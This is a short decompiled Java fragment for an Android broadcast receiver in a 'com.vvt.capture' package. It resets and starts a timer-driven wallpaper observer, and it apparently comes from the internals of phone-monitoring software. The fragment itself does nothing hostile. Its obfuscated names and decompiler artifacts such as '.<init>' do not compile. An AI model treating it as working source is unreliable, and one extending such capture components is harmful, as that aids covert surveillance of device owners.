package com.vvt.capture.f.a;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.vvt.aj.a;

class h
  extends BroadcastReceiver
{
  private h(f paramf) {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    boolean bool = f.b();
    if (bool) {}
    Object localObject1 = f.a(this.a);
    if (localObject1 != null)
    {
      f.a(this.a).b();
      localObject1 = this.a;
      localObject2 = null;
      f.a((f)localObject1, null);
    }
    localObject1 = this.a;
    Object localObject2 = new com/vvt/capture/f/a/i;
    String str = "WallpaperObserverNornal";
    long l = 30;
    ((i)localObject2).<init>(this, str, l);
    f.a((f)localObject1, (a)localObject2);
    localObject1 = f.a(this.a);
    localObject2 = "WallpaperObCountDownTimer";
    ((a)localObject1).setName((String)localObject2);
    localObject1 = f.a(this.a);
    ((a)localObject1).start();
    bool = f.b();
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */